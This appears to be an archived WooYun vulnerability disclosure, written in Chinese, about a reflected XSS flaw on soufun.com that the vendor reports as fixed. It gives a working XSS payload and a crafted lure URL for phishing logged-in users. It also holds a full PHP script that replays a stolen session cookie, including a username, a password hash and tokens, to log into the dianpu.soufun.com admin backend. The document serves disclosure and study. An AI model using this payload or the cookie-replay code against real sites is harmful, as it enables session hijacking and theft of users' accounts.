@@ -1,0 +1,322 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜房网存在xss漏洞可导致csrf可导致用户帐号被盗  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜房网存在xss漏洞可导致csrf可导致用户帐号被盗  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/IT P民">IT P民</a> 
+</li><li>提交时间：		2013-08-09 18:53</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-09：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-09：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-19：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-08-29：	细节向普通白帽子公开<br/>
+									2013-09-08：	细节向实习白帽子公开<br/>
+									2013-09-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">对输入的参数输出过滤不严谨导致反射型xss,泄漏用户cookie，导致信息被盗取，用户被登录</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这个漏洞在wooyun提了两次，没有审核通过，第二次审核不通过的提示语为：问题确实存在但是危害不大。<br />
+<br />
+<br />
+<br />
+楼主认为反射型的xss漏洞可大可小，看怎么去利用。所以楼主现在一步步深挖，看这个漏洞危害可否被放大。<br />
+<br />
+<br />
+<br />
+（1）寻找xss漏洞<br />
+<br />
+目标链接：http://home.soufun.com/jiancai/SearchList.aspx<br />
+<br />
+漏洞重现方法：在目标链接处输入 &lt;a href=&quot;http://www.wooyun.org&quot;&gt;&lt;img src=&quot;#&quot;/**/onerror=alert(document.cookie) width=100&gt;点击参加活动&lt;/a&gt;，在IE下可以看到反射型xss了。<br />
+<br />
+</p><p class="detail"><a href="../images/09181719cd528161b670e4b7132a5aae191f1018.png" target="_blank"><img src="../images/09181719cd528161b670e4b7132a5aae191f1018.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+对于没有登录的用户来说，确实没有什么危害，但是，对于已经登录的用户，我们来看cookie里存放了些什么东西：<br />
+<br />
+</p><p class="detail"><a href="../images/0918382378a0cc0a56145bf54add121e264c9864.png" target="_blank"><img src="../images/0918382378a0cc0a56145bf54add121e264c9864.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+如你所见，用户名，加密后的密码，都在这里边。<br />
+<br />
+<br />
+<br />
+这里不讨论怎么去破解加密的密码，继续来演进这个漏洞有什么危害<br />
+<br />
+<br />
+<br />
+（2）寻找目标，这是社会工程学的问题了。<br />
+<br />
+找一个搜房 装修帮的用户，也很容易找，如：http://home.soufun.com/shop/40794726/<br />
+<br />
+，发给用户这个链接http://home.soufun.com/jiancai/SearchList.aspx?level=1&amp;q=%3Ca+href%3D%22http%3A%2F%2Fwww.wooyun.org%22%3E%3Cimg+src%3D%22%23%22%2F**%2Fonerror%3Dalert%28document.cookie%29+width%3D100%3E%B5%E3%BB%F7%B2%CE%BC%D3%BB%EE%B6%AF%3C%2Fa%3E&amp;category=&amp;x=57&amp;y=14<br />
+<br />
+<br />
+<br />
+标题说什么 搜房网推出什么优惠大活动神马的东西，<br />
+<br />
+<br />
+<br />
+如果当前用户已经登录了装修帮后台，并访问了这个链接，那么恭喜，用户被反射型xss攻击了，如果不是alert用户的cookie,而是收集用户的cookie呢？会有什么危害？<br />
+<br />
+<br />
+<br />
+（3）假设我们已经通过步骤（2）的xss存储了用户的cookie（其实要收集也很简单，一个http请求就是了），我们通过一下的脚本来跑一跑，看有什么效果：<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+function explode_cookie($cookie) {<br />
+	$cookie_arr = explode(&quot;;&quot;, $cookie);<br />
+<br />
+	foreach ($cookie_arr as $cookie_str) {<br />
+		list($cookie_key,$cookie_value) = explode(&quot;=&quot;, $cookie_str);<br />
+		$cookie_key = trim($cookie_key);<br />
+		setcookie($cookie_key,$cookie_value,1800,&#039;/&#039;,&#039;soufun.com&#039;);<br />
+	}<br />
+}<br />
+<br />
+function url_replace($str) {<br />
+	$pattern_var = &quot;/href=([&#039;\&quot;])\//&quot;;<br />
+	$replace_var = &quot;href=&#039;http://dianpu.soufun.com/&quot;;<br />
+	<br />
+	if (preg_match($pattern_var, $str)) {<br />
+		$str = preg_replace($pattern_var, $replace_var, $str);<br />
+	}<br />
+	<br />
+	return $str;<br />
+}<br />
+<br />
+$admin_url = array(<br />
+	&quot;http://dianpu.soufun.com/jiancai/dealer/top.aspx&quot;,<br />
+	&quot;http://dianpu.soufun.com/jiancai/dealer/left.aspx&quot;,<br />
+	&quot;http://dianpu.soufun.com/index.aspx&quot;,	<br />
+);<br />
+<br />
+$cookie = &quot;unique_cookie=U_b8nnhkz09nmlasskytp5f3ymg54hk50614w*12; __utmc=77873355; jiatxShopWindow=1; global_cookie=b8nnhkz09nmlasskytp5f3ymg54hk50614w; __utma=77873355.1662561517.1376029049.1376029049.1376037185.2; __utmb=77873355.9.10.1376037185; __utmz=77873355.1376029049.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); passport=usertype=1&amp;userid=42545987&amp;username=testxss89&amp;password=381F5D8A96DFF049&amp;isvalid=6BB50273C1F61D91962B0E259B086163&amp;validation=6BB50273C1F61D912EC3FE322B6620E8917B57BF3DAD9B00; homezxb=sogo_dealerid=64451&amp;Sogo_validation=C89DBE9F840476F053AEB80D5B7645B30D8754A1447B3A21&amp;home_weike_userid=-64451&amp;home_weike_user_validation=C89DBE9F840476F037BB50C741626714147ECDCB693EE44F; rememberRightname=testxss89&quot;;<br />
+$ch = curl_init();<br />
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);<br />
+explode_cookie($cookie);<br />
+foreach ($admin_url as $url) {<br />
+	$header = array();<br />
+	$header[] = &quot;Cookie: {$cookie}\r\n&quot;;<br />
+	curl_setopt($ch, CURLOPT_URL, $url);<br />
+	curl_setopt($ch, CURLOPT_HTTPHEADER, $header);<br />
+	$data = curl_exec($ch);<br />
+	$data = url_replace($data);<br />
+	echo $data;<br />
+}<br />
+<br />
+curl_close($ch);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+上面的脚本的意图就是，模拟http请求装修帮的后台。<br />
+<br />
+<br />
+<br />
+正常的后台是这样的：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09182947c5e358afcf5da22dd8515fd54c667290.png" target="_blank"><img src="../images/09182947c5e358afcf5da22dd8515fd54c667290.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+我们模拟登录后的后台是这样的：<br />
+<br />
+</p><p class="detail"><a href="../images/09183121345c1cca28ec3ad11f3e025d7f3219c8.png" target="_blank"><img src="../images/09183121345c1cca28ec3ad11f3e025d7f3219c8.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09183145aea43eebe299c5eb817376c36c26c8c1.png" target="_blank"><img src="../images/09183145aea43eebe299c5eb817376c36c26c8c1.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09183446de7eedb99f39ef1142fb2e5e3d60216c.png" target="_blank"><img src="../images/09183446de7eedb99f39ef1142fb2e5e3d60216c.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09183503eb5d43ac64d3a7196cb2bf84b247c40a.png" target="_blank"><img src="../images/09183503eb5d43ac64d3a7196cb2bf84b247c40a.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+如你所见，我已经登录了当前用户的帐号~<br />
+<br />
+<br />
+<br />
+那么还有什么事情不能做呢？<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+这个漏洞可以做更多有想象力的事情，不管危害如何，希望尽快修复。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/09183527f2ca09193a8d3eabc0f88f843d19479d.png" target="_blank"><img src="../images/09183527f2ca09193a8d3eabc0f88f843d19479d.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/0918382378a0cc0a56145bf54add121e264c9864.png" target="_blank"><img src="../images/0918382378a0cc0a56145bf54add121e264c9864.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/09183121345c1cca28ec3ad11f3e025d7f3219c8.png" target="_blank"><img src="../images/09183121345c1cca28ec3ad11f3e025d7f3219c8.png" alt="5.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">（1）建议 不要依赖cookie,连接session断掉之后cookie失效。<br />
+<br />
+（2）修复xss漏洞 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/IT P民" title="IT P民">IT P民</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-033982" title="搜房网存在xss漏洞可导致csrf可导致用户帐号被盗">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-08-09 21:30</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已经修复，多谢！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="33982";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
